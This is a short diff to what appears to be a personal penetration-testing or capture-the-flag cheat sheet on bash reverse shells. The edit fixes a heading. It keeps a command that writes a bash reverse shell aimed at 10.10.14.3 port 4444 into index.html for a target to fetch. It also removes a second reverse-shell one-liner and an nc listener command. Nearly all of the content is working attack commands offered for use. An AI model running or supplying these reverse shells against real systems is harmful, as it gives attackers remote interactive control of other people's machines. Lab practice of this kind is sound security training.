@@ -1,6 +1,6 @@
 # Bash
 
-R**everse shell bash**
+**reverse shell bash**
 
 ```bash
 echo 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1' > index.html
@@ -14,12 +14,3 @@ fg
 <return>
 ```
 
-
-
-Bash Reverse Shell
-
-```bash
-bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
-
-nc -nlvp 4444
-```
